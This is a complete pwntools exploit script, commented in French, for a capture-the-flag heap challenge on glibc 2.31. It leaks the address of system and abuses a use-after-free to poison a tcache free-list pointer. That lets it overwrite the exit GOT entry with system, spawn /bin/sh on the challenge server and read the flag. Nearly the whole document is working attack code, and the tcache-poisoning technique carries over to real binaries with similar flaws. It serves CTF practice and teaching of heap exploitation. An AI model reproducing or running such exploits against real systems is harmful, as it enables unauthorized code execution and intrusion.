#!/usr/bin/env python3
# Heap 5 - Terrible tcaches  (Pwny-CTF, Pwn, glibc 2.31)
#
# Idee : tcache poisoning. glibc 2.31 -> pas de safe-linking, le fd d'un chunk
# libere est un pointeur BRUT (aucun chiffrement). Le binaire fait a EXIT :
#     exit((int64_t)"/bin/sh")
# donc si on remplace l'entree GOT de exit (0x404070, fixe car no-PIE + partial
# RELRO) par l'adresse de system, alors "exit" declenche system("/bin/sh").
#
# UAF : del_user peut liberer le user courant ; current_user reste un pointeur
# pendouillant, et rename_user fait memcpy(current_user, payload, len) -> on
# ecrit le fd d'un chunk tcache libere, puis malloc nous renvoie la GOT.

from pwn import *

elf  = ELF("./heap5_patched")
libc = ELF("./libc-2.31.so")
context.binary = elf
context.log_level = "info"

EXIT_GOT = elf.got["exit"]          # 0x404070

def start():
    if args.REMOTE:
        return remote("chal.sigpwny.com", 1364)
    return process([elf.path])

io = start()

def cmd(line):
    io.sendlineafter(b"> ", line)

# 1) Fuite de l'adresse de system (menu "leak_system")
io.sendlineafter(b"> ", b"leak_system")
io.recvuntil(b"libc system = ")
system_addr = int(io.recvline().strip(), 16)
log.success(f"system = {hex(system_addr)}")

# 2) Preparer deux chunks de meme taille (0x90) -> index 1 et 2
cmd(b"create_user")    # index 1  (C1)
cmd(b"create_user")    # index 2  (C2)

# 3) Les liberer dans la tcache ; C2 libere EN DERNIER tout en restant courant
cmd(b"del_user 1")     # free C1          tcache[0x90]: C1            count=1
cmd(b"switch_user 2")  # current_user = C2
cmd(b"del_user 2")     # free C2 (UAF)    tcache[0x90]: C2 -> C1      count=2

# 4) Empoisonner le fd de C2 (le chunk courant, libere) -> pointe sur la GOT
#    memcpy(C2, p64(EXIT_GOT), 8). Pas de newline : il serait memcpy et
#    corromprait l'octet suivant (arg1_len = octets_lus - 12).
io.sendafter(b"> ", b"rename_user " + p64(EXIT_GOT))
#    tcache[0x90]: C2 -> EXIT_GOT   count=2

# 5) Deux mallocs : le 1er rend C2, le 2e rend EXIT_GOT (devient users[4])
cmd(b"create_user")    # index 3 -> C2
cmd(b"create_user")    # index 4 -> EXIT_GOT

# 6) Se placer sur le chunk = GOT, et y ecrire system -> exit@GOT = system
cmd(b"switch_user 4")
io.sendafter(b"> ", b"rename_user " + p64(system_addr))

# 7) exit -> exit("/bin/sh") -> system("/bin/sh") -> shell
#    On attend le prompt avant d'envoyer "exit" (sinon read(128) du menu avale
#    aussi la commande shell suivante), puis on laisse le shell naitre.
io.sendlineafter(b"> ", b"exit")
sleep(1.5)

io.sendline(b"id; cat flag* 2>/dev/null; ls")
io.interactive()
